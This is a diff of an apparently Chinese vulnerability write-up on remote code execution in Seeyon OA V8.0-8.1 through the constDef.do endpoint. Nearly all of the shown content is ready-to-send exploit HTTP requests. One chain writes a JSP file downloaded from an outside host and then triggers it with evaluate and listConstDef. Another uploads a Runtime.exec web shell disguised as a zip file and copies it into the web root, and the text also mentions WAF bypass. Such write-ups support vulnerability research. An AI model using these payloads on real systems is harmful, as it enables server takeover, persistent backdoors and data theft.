@@ -21,7 +21,7 @@ source: "MrWQ/vulnerability-paper"
 
 影响范围  
 
-*   **version:   Seeyon V8.0-8.1**
+*   **version:   Seeyon V8.0-8.1**
     
 
 ### 漏洞分析
@@ -71,14 +71,14 @@ _**> Step1：**_
 出网情况直接通过远程下载可以比较有效 **Bypass Waf** 方法。
 
 ```
-POST /seeyon/constDef.do HTTP/1.1
-Host: 172.16.135.220:8089
-accept: */*
-Accept-Encoding: gzip, deflate
-Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
-Connection: close
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 545
+POST /seeyon/constDef.do HTTP/1.1
+Host: 172.16.135.220:8089
+accept: */*
+Accept-Encoding: gzip, deflate
+Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 545
 
 method=newConstDef&constKey=uddd1&constDefine=new+File('../webapps/ROOT/test.jspx')+<<+new+URL('http%3a//192.168.43.81%3a18080/123.txt').text&constType=2
 
@@ -92,14 +92,14 @@ _**> Step2：**_
 引用**`Step1:`**定义常量，构造闭合造成代码执行。
 
 ```
-POST /seeyon/constDef.do HTTP/1.1
-Host: 172.16.135.220:8089
-accept: */*
-Accept-Encoding: gzip, deflate
-Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
-Connection: close
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 89
+POST /seeyon/constDef.do HTTP/1.1
+Host: 172.16.135.220:8089
+accept: */*
+Accept-Encoding: gzip, deflate
+Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 89
 
 method=newConstDef&constKey=runtime1c2345accaccc&constDefine=evaluate+$uddd1&constType=3
 
@@ -113,14 +113,14 @@ _**> Step3：**_
 通过**`listConstDef`**方法触发漏洞
 
 ```
-POST /seeyon/constDef.do HTTP/1.1
-Host: 172.16.135.220:8089
-accept: */*
-Accept-Encoding: gzip, deflate
-Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
-Connection: close
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 35
+POST /seeyon/constDef.do HTTP/1.1
+Host: 172.16.135.220:8089
+accept: */*
+Accept-Encoding: gzip, deflate
+Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
 
 method=listConstDef&page=1&rows=100
 
@@ -140,47 +140,47 @@ _**> Step1：**_
 例如：/base/upload/2024/07/22/2101525989813472287
 
 ```
-POST /seeyon/fileUpload.do?method=processUpload&maxSize= HTTP/1.1
-Host: 172.16.135.236:8089
-Cookie: JSESSIONID=0D3102C6F8445B2207B3A29DF9C4BAE6
-Connection: close
-Upgrade-Insecure-Requests: 1
-Content-Type: multipart/form-data; boundary=---------------------------1416682316313
-Content-Length: 1172
+POST /seeyon/fileUpload.do?method=processUpload&maxSize= HTTP/1.1
+Host: 172.16.135.236:8089
+Cookie: JSESSIONID=0D3102C6F8445B2207B3A29DF9C4BAE6
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=---------------------------1416682316313
+Content-Length: 1172
 
 -----------------------------1416682316313
-Content-Disposition: form-data; 
-
-
------------------------------1416682316313
-Content-Disposition: form-data; 
+Content-Disposition: form-data; 
 
 
 -----------------------------1416682316313
-Content-Disposition: form-data; 
+Content-Disposition: form-data; 
 
 
 -----------------------------1416682316313
-Content-Disposition: form-data; 
+Content-Disposition: form-data; 
 
 
 -----------------------------1416682316313
-Content-Disposition: form-data; 
+Content-Disposition: form-data; 
 
 
 -----------------------------1416682316313
-Content-Disposition: form-data; 
+Content-Disposition: form-data; 
 
 
 -----------------------------1416682316313
-Content-Disposition: form-data; 
+Content-Disposition: form-data; 
+
+
+-----------------------------1416682316313
+Content-Disposition: form-data; 
 
 false
 -----------------------------1416682316313
-Content-Disposition: form-data; 
-Content-Type: Image/x-zip-compressed
+Content-Disposition: form-data; 
+Content-Type: Image/x-zip-compressed
 
-<% Runtime.getRuntime().exec(request.getParameter("a"));%>
+<% Runtime.getRuntime().exec(request.getParameter("a"));%>
 -----------------------------1416682316313--
 
 
@@ -193,15 +193,15 @@ _**> Step2：**_
 通过读取本地文件，进行写入文件可以完美解决写入文件长度的长度。
 
 ```
-POST /seeyon/constDef.do HTTP/1.1
-Host: 172.16.135.220:8089
-accept: */*
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
-Accept-Encoding: gzip, deflate
-Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
-Connection: close
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 545
+POST /seeyon/constDef.do HTTP/1.1
+Host: 172.16.135.220:8089
+accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
+Accept-Encoding: gzip, deflate
+Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 545
 method=newConstDef&constKey=u6da&constDefine=new+File('../webapps/ROOT/gsl.jsp')+<<+new+File('../../base/upload/2024/06/06/2101525989813472287').text&constType=2
 
 ```
